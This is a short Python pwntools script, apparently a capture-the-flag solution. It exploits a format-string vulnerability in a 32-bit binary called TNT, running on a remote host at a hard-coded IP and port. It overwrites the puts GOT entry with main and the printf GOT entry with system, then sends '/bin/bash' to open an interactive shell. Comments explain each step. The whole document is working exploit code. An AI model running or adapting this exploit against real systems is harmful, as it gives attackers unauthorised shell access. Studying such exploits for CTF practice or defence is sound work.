from pwn import *
#context.arch = 'i386'

local = False

binary = ELF("Downloads/TNT")
if local :
	p = process("Downloads/TNT")
else :
	p=remote('3.123.29.138',4444)
main = 0x80491BD 
system = 0x8049060
puts_got = binary.got['puts']
printf_got = binary.got['printf']
# we overwrite puts address with main address 

write = {puts_got: main }
payload = fmtstr_payload(4, write,write_size='short') 
p.sendline(payload)
#p.recvline()
log.info("overwriting puts with main success !")
#print(payload)
#payload = fmtstr_payload(1,write ,write_size='short')
#pause()
#with open("Downloads/hihi" , 'wb') as f :
#         f.write(payload)

# now that we have infinite main 
# we overwrite printf address with system address in the got entry 

payload =fmtstr_payload(4,{printf_got:system} , write_size='short')
p.sendline(payload)
p.recvline()
log.info("overwriting system with printf success !")

#now we supply /bin/bash as our input

payload=b"/bin/bash"
log.info("passing /bin/bash as argument to system")
print("SHELLY on the way !") 
p.sendline(payload)
p.interactive()
